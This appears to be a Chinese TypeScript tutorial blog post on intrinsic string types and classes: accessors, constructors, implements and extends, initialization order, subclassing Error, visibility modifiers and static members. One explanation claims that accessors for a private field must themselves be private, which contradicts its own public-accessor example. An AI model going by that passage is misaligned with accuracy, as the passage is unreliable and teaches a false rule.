<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">LowercaseGreeting</span> = <span class="string">&quot;hello, world&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Greeting</span> = <span class="title class_">Capitalize</span>&lt;<span class="title class_">LowercaseGreeting</span>&gt;; <span class="comment">// type Greeting = &quot;Hello, world&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Uncapitalize<StringType></strong></p>
<p>将字符串中的第一个字符转换为等效的小写字母。</p>
<p>例子</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">UppercaseGreeting</span> = <span class="string">&quot;HELLO WORLD&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">UncomfortableGreeting</span> = <span class="title class_">Uncapitalize</span>&lt;<span class="title class_">UppercaseGreeting</span>&gt;; <span class="comment">// type UncomfortableGreeting = &quot;hELLO WORLD&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>内在字符串操作类型的技术细节</p>
</blockquote>
<p>从 TypeScript 4.1 开始，这些内部函数的代码直接使用 JavaScript 字符串运行时函数进行操作，并且无需了解区域设置。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">applyStringMapping</span>(<span class="params"><span class="built_in">symbol</span>: <span class="built_in">Symbol</span>, str: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (intrinsicTypeKinds.<span class="title function_">get</span>(<span class="built_in">symbol</span>.<span class="property">escapedName</span> <span class="keyword">as</span> <span class="built_in">string</span>)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="title class_">IntrinsicTypeKind</span>.<span class="property">Uppercase</span>: <span class="keyword">return</span> str.<span class="title function_">toUpperCase</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="title class_">IntrinsicTypeKind</span>.<span class="property">Lowercase</span>: <span class="keyword">return</span> str.<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="title class_">IntrinsicTypeKind</span>.<span class="property">Capitalize</span>: <span class="keyword">return</span> str.<span class="title function_">charAt</span>(<span class="number">0</span>).<span class="title function_">toUpperCase</span>() + str.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="title class_">IntrinsicTypeKind</span>.<span class="property">Uncapitalize</span>: <span class="keyword">return</span> str.<span class="title function_">charAt</span>(<span class="number">0</span>).<span class="title function_">toLowerCase</span>() + str.<span class="title function_">slice</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="类成员"><a href="#类成员" class="headerlink" title="类成员"></a>类成员</h3><p>属性、方法、readonly、、getters&#x2F;setters、索引签名</p>
<h4 id="getters-x2F-setters"><a href="#getters-x2F-setters" class="headerlink" title="getters&#x2F;setters"></a>getters&#x2F;setters</h4><blockquote>
<p>请注意，一个没有额外逻辑的字段支持的 get&#x2F;set 对在JavaScript中很少有用。如果你不需要在get&#x2F;set 操作中添加额外的逻辑，暴露公共字段也是可以的。</p>
</blockquote>
<p>TypeScript对访问器有一些特殊的推理规则：</p>
<ul>
<li>如果存在 get ，但没有 set ，则该属性自动是只读的</li>
<li>如果没有指定 setter 参数的类型，它将从 getter 的返回类型中推断出来</li>
<li>访问器和设置器必须有相同的成员可见性</li>
</ul>
<p>从TypeScript 4.3开始，可以有不同类型的访问器用于获取和设置</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Thing</span> &#123;</span><br><span class="line">  _size = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">get</span> <span class="title function_">size</span>(): <span class="built_in">number</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_size</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">set</span> <span class="title function_">size</span>(<span class="params">value: <span class="built_in">string</span> | <span class="built_in">number</span> | <span class="built_in">boolean</span></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> num = <span class="title class_">Number</span>(value);</span><br><span class="line">    <span class="comment">// 不允许NaN、Infinity等</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Number</span>.<span class="built_in">isFinite</span>(num)) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">_size</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_size</span> = num;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问器和设置器必须有相同的成员可见性？</p>
<p>在 TypeScript 中，访问器和设置器必须有相同的成员可见性。也就是说，如果您为一个成员定义了访问器或设置器，那么这个成员的访问级别必须与访问器或设置器中的访问级别相同。</p>
<p>例如，如果您为一个类的私有成员定义了访问器或设置器，那么这个访问器或设置器的访问级别也必须是私有的。同样，如果您为一个类的受保护成员定义了访问器或设置器，那么这个访问器或设置器的访问级别也必须是受保护的。</p>
<p>以下是一个 TypeScript 类的例子，其中访问器和设置器具有相同的成员可见性：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">_value</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">get</span> <span class="title function_">value</span>(): <span class="built_in">number</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">newValue: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">_value</span> = newValue;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里的public一般省略</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>MyClass</code> 类定义了一个私有成员变量 <code>_value</code>，并为它定义了一个访问器 <code>get value()</code> 和一个设置器 <code>set value(newValue: number)</code>。由于 <code>_value</code> 是私有成员，因此访问器和设置器的访问级别也必须是私有的。</p>
<p>访问器和设置器的可见性要求确保了类的封装性和安全性，防止了对类的私有或受保护成员的直接访问。</p>
<h4 id="构造函数（构造器）"><a href="#构造函数（构造器）" class="headerlink" title="构造函数（构造器）"></a>构造函数（构造器）</h4><p>在 TypeScript 中，类的构造函数可以接受参数，并且这些参数可以定义它们的类型。但是，类的构造函数不能有类型参数。</p>
<p>这是因为类型参数是在使用泛型时定义的，它们是在编译时确定的。而构造函数是在运行时调用的，因此在构造函数中定义类型参数是没有意义的。</p>
<p>如果您想在类中使用泛型，可以将泛型类型参数定义为类级别的类型参数，然后在类中的方法和属性中使用它们。例如：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyGenericClass</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="attr">value</span>: T;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">value: T</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">getValue</span>(): T &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>MyGenericClass</code> 类接受一个类型参数 <code>T</code>，并在构造函数中接受一个类型为 <code>T</code> 的参数 <code>value</code>。然后，<code>getValue</code> 方法返回类型为 <code>T</code> 的值。</p>
<p>您可以实例化该类并将不同类型的值传递给构造函数：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myStringClass = <span class="keyword">new</span> <span class="title class_">MyGenericClass</span>&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myStringClass.<span class="title function_">getValue</span>()); <span class="comment">// 输出 &#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myNumberClass = <span class="keyword">new</span> <span class="title class_">MyGenericClass</span>&lt;<span class="built_in">number</span>&gt;(<span class="number">42</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myNumberClass.<span class="title function_">getValue</span>()); <span class="comment">// 输出 42</span></span><br></pre></td></tr></table></figure>

<p>构造函数不能有返回类型注释</p>
<p>在 TypeScript 中，构造函数不能有显式的返回类型注释，因为构造函数的返回值是由类本身确定的，而不是由构造函数的实现决定的。</p>
<p>当您使用 <code>new</code> 操作符实例化一个类时，构造函数会返回该类的实例，而且该实例的类型就是该类本身。因此，您不需要在构造函数中指定返回类型。</p>
<p>以下是一个 TypeScript 类的例子：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> message: <span class="built_in">string</span></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">showMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myInstance = <span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&#x27;Hello, world!&#x27;</span>);</span><br><span class="line">myInstance.<span class="title function_">showMessage</span>(); <span class="comment">// 输出 &#x27;Hello, world!&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>MyClass</code> 类的构造函数接受一个 <code>message</code> 参数，并将其保存在类的私有成员变量中。然后，类定义了一个 <code>showMessage</code> 方法，它输出 <code>message</code> 的值。</p>
<p>当我们使用 <code>new</code> 操作符创建一个 <code>MyClass</code> 实例时，不需要指定返回类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myInstance = <span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&#x27;Hello, world!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>因为构造函数的返回值是 <code>MyClass</code> 类的实例，它的类型已经由类本身决定了。</p>
<h3 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h3><h4 id="implements"><a href="#implements" class="headerlink" title="implements"></a>implements</h4><ul>
<li>继承接口，需要实现该接口的方法</li>
<li>类也可以实现多个接口，逗号隔开，例如：<code>class c implements A, B &#123;</code></li>
</ul>
<p>注意事项</p>
<p>implements 子句只是检查类是否可以被当作接口类型来对待。它根本不会改变类的类型或其方法。一个常见的错误来源是认为 implements 子句会改变类的类型–它不会！</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Checkable</span> &#123;</span><br><span class="line">  <span class="title function_">check</span>(<span class="attr">name</span>: <span class="built_in">string</span>): <span class="built_in">boolean</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameChecker</span> <span class="keyword">implements</span> <span class="title class_">Checkable</span> &#123;</span><br><span class="line">  <span class="title function_">check</span>(<span class="params">s</span>) &#123; <span class="comment">// error 参数&quot;s&quot;隐式具有&quot;any&quot;类型</span></span><br><span class="line">    <span class="comment">// any：注意这里没有错误</span></span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">toLowercse</span>() === <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们也许期望 s 的类型会受到 check 的 name: string 参数的影响。事实并非如此–实现子句并没有改变类主体的检查方式或其类型的推断。</p>
<p>同样地，实现一个带有可选属性的接口并不能创建该属性。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  y?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">implements</span> A &#123;</span><br><span class="line"> x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> c = <span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line">c.<span class="property">y</span> = <span class="number">10</span>; <span class="comment">// error 类型&quot;c&quot;上不存在属性&quot;y&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h4><p>类可以从基类中扩展出来。派生类拥有其基类的所有属性和方法，也可以定义额外的成员。</p>
<h4 id="重写方法"><a href="#重写方法" class="headerlink" title="重写方法"></a>重写方法</h4><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params">name?: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (name === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>.<span class="title function_">greet</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(name.<span class="title function_">toUpperCase</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Derived</span>();</span><br><span class="line">d.<span class="title function_">greet</span>();</span><br><span class="line">d.<span class="title function_">greet</span>(<span class="string">&#x27;reader&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>派生类遵循其基类契约是很重要的。请记住，通过基类引用来引用派生类实例是非常常见的（而且总是合法的！）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过基类引用对派生实例进行取别名</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: <span class="title class_">Base</span> = d;</span><br><span class="line"><span class="comment">// 没问题</span></span><br><span class="line">b.<span class="title function_">greet</span>();</span><br></pre></td></tr></table></figure>

<p>如果 Derived 没有遵守Base的约定怎么办？</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * error</span></span><br><span class="line"><span class="comment">     * 类型“Derived”中的属性“greet”不可分配给基类型“Base”中的同一属性。</span></span><br><span class="line"><span class="comment">     * 不能将类型“(name: string) =&gt; void”分配给类型“() =&gt; void”。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="title function_">greet</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(name.<span class="title function_">toUpperCase</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们不顾错误编译这段代码，这个样本就会崩溃：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: <span class="title class_">Base</span> = <span class="keyword">new</span> <span class="title class_">Derived</span>();</span><br><span class="line"><span class="comment">// 崩溃，因为 &quot;name&quot;将是 undefined。</span></span><br><span class="line">b.<span class="title function_">greet</span>();</span><br></pre></td></tr></table></figure>

<h4 id="初始化顺序"><a href="#初始化顺序" class="headerlink" title="初始化顺序"></a>初始化顺序</h4><p>让我们看看一下这段代码：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  name = <span class="string">&quot;base&quot;</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;My name is &quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line"> name = <span class="string">&quot;derived&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 打印 &quot;base&quot;, 而不是 &quot;derived&quot;</span></span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Derived</span>();</span><br></pre></td></tr></table></figure>

<p>这里发生了什么？</p>
<p>按照JavaScript的定义，类初始化的顺序是：</p>
<ul>
<li>基类的字段被初始化</li>
<li>基类构造函数运行</li>
<li>派生类的字段被初始化</li>
<li>派生类构造函数运行</li>
</ul>
<p>这意味着基类构造函数在自己的构造函数中看到了自己的name值，因为派生类的字段初始化还没有运行。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    name = <span class="string">&#x27;base&#x27;</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;My name is &#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line">    name = <span class="string">&#x27;derived&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Derived</span>();</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">My name is base</span><br><span class="line">derived</span><br></pre></td></tr></table></figure>

<h4 id="继承内置类型"><a href="#继承内置类型" class="headerlink" title="继承内置类型"></a>继承内置类型</h4><blockquote>
<p>注意：如果你不打算继承Array、Error、Map等内置类型，或者你的编译目标明确设置ES6&#x2F;ES2015或以上，你可以跳过本节。</p>
</blockquote>
<p>在ES2015中，返回对象的构造函数隐含地替代了 super(…) 的任何调用者的 this 的值。生成的构造函数代码有必要捕获 super(…) 的任何潜在返回值并将其替换为 this 。因此，子类化 Error 、 Array 等可能不再像预期那样工作。这是由于 Error 、 Array 等的构造函数使用ECMAScript 6的 new.target 来调整原型链；然而，在ECMAScript 5中调用构造函数时，没有办法确保 new.target 的值。其他的下级编译器一般默认有同样的限制。</p>
<p>instanceof 将在子类的实例和它们的实例之间被打破，所以 （new MsgError()）instanceofMsgError 将返回 false</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MsgError</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Error</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">m: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(m);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">sayHello</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span> + <span class="variable language_">this</span>.<span class="property">message</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> msgError = <span class="keyword">new</span> <span class="title class_">MsgError</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(msgError <span class="keyword">instanceof</span> <span class="title class_">MsgError</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>你可以在任何 super(…) 调用后立即手动调整原型。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MsgError</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Error</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">m: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(m);</span><br><span class="line">    <span class="comment">// 明确地设置原型。</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(<span class="variable language_">this</span>, <span class="title class_">MsgError</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="title function_">sayHello</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello &quot;</span> + <span class="variable language_">this</span>.<span class="property">message</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> msgError = <span class="keyword">new</span> <span class="title class_">MsgError</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(msgError <span class="keyword">instanceof</span> <span class="title class_">MsgError</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="成员可见性"><a href="#成员可见性" class="headerlink" title="成员可见性"></a>成员可见性</h3><h4 id="public"><a href="#public" class="headerlink" title="public"></a>public</h4><p>所有可访问</p>
<h4 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h4><p>只对他们所声明的子类可见，子类中可访问，子类实例后不可访问。</p>
<p>派生类需要遵循它们的基类契约，但可以选择公开具有更多能力的基类的子类型。这包括将受保护的成员变成公开。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> m = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line">  <span class="comment">// 没有修饰符，所以默认为&#x27;公共&#x27;(&#x27;public&#x27;)</span></span><br><span class="line">  m = <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Derived</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d.<span class="property">m</span>); <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

<h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p>派生类不可访问，子类实例后不可访问。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line"><span class="comment">// 不能从类外访问</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line">  <span class="title function_">showX</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 不能在子类中访问</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h3><p>类可以有静态成员。这些成员并不与类的特定实例相关联。它们可以通过类的构造函数对象本身来访问。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> x = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">printX</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MyClass</span>.<span class="property">x</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MyClass</span>.<span class="property">x</span>);</span><br><span class="line"><span class="title class_">MyClass</span>.<span class="title function_">printX</span>();</span><br></pre></td></tr></table></figure>

<p>静态成员也可以使用相同的 public 、 protected 和 private 可见性修饰符。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> x = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MyClass</span>.<span class="property">x</span>);</span><br></pre></td></tr></table></figure>

<p>静态成员也会被继承。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">getGreeting</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Base</span> &#123;</span><br><span class="line"> myGreeting = <span class="title class_">Derived</span>.<span class="title function_">getGreeting</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="特殊静态名称"><a href="#特殊静态名称" class="headerlink" title="特殊静态名称"></a>特殊静态名称</h4><p>一般来说，从函数原型覆盖属性是不安全的&#x2F;不可能的。因为类本身就是可以用 new 调用的函数，所以某些静态名称不能使用。像 name 、 length 和 call 这样的函数属性，定义为静态成员是无效的。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">S</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> name = <span class="string">&#x27;s!&#x27;</span>; <span class="comment">// error 静态属性“name”与构造函数“S”的内置属性函数“name”冲突。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么没有静态类"><a href="#为什么没有静态类" class="headerlink" title="为什么没有静态类"></a>为什么没有静态类</h4><p>TypeScript（和JavaScript）没有像C#和Java那样有一个叫做静态类的结构。</p>
<p>这些结构体的存在，只是因为这些语言强制所有的数据和函数都在一个类里面；因为这个限制在TypeScript中不存在，所以不需要它们。一个只有一个实例的类，在JavaScript&#x2F;TypeScript中通常只是表示为一个普通的对象。</p>
<p>例如，我们不需要TypeScript中的 “静态类 “语法，因为一个普通的对象（甚至是顶级函数）也可以完成</p>
<p>这个工作。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不需要 &quot;static&quot; class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyStaticClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">doSomething</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 首选 (备选 1)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="comment">// 首选 (备选 2)</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MyHelperObject</span> = &#123;</span><br><span class="line">    <span class="title function_">dosomething</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

